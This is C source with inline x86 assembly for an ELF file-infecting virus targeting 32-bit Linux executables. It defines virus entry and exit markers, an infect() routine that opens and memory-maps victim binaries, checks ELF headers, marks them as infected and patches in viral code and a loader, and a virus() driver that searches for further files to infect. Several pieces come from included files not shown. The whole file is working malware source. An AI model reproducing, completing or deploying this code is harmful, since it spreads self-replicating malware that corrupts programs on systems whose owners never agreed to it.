#include <stdint.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <elf.h>

#include "../Loader/loader.h"

typedef struct {
	int size;
	void *self;
	/* random */
	uint32_t seed;
	/* loader */
	uint8_t *loader;
} globals;

register globals *g asm("ebp");
extern void virus_start;
static void virus_end(void);
asm(	".globl fake_host; fake_host: mov $1, %eax; xorl %ebx,%ebx; int $0x80");
asm(	".globl virus_start; virus_start:\n"
	"call virus; add $24,%esp; popa; .byte 0x68; old_entry: .long fake_host; ret");

#include "../h/syscalls.h"
#include "../h/infect.h"
#include "../h/strings.c"

unsigned int random(unsigned int range)
{
	return range == 0 ? 0 : (g->seed = g->seed * 214013 + 2531011) % range;
}

static void infect(char *filename)
{
	int h, l, i;
	char *m;
	Elf32_Ehdr *ehdr;
	Elf32_Phdr *phdr;
	Elf32_Shdr *shdr;

	/* open victim, check size, mmap... */	
	if ((h = open(filename, 2)) < 0)
		return;
	if ((l = lseek(h, 0, 2)) < MIN_VICTIM_SIZE || l > MAX_VICTIM_SIZE)
		goto _close;
	m = (void*)mmap(0x1000, l, PROT_READ|PROT_WRITE, MAP_SHARED, h, 0);
	if (m > (char*)0xfffff000)
		goto _close;
	/* check ELF header */
	ehdr = (Elf32_Ehdr*)m;
	phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);
	shdr = (Elf32_Shdr*)(m + ehdr->e_shoff);
	if (ehdr->e_type != ET_EXEC || ehdr->e_machine != EM_386 ||
		ehdr->e_version != EV_CURRENT ||
		(ehdr->e_ident[EI_OSABI] != ELFOSABI_NONE &&
		 ehdr->e_ident[EI_OSABI] != ELFOSABI_TARGET))
		goto _unmap;
	/* already infected? */
	if (m[15])
		goto _unmap;

#include "infect-pht.c"

	m[15]++;

_unmap:	munmap(m, l);
_close:	close(h);
}

#include "../h/search.c"

void virus(uint32_t self)
{

	/* determine our own size and location in memory, init globals */
	globals glob;
	g = &glob;
	g->size = (uint32_t)&virus_end - (uint32_t)&virus_start;
	g->self = __builtin_return_address(0) - 5;

	/* init random() */
	g->seed = time(0);

	/* loader */
	uint8_t loader[CSIZE];
#include "../Loader/loader1.c"
	g->loader = loader;

	/* do our job */
	search(NULL);
}

static void virus_end(void){};
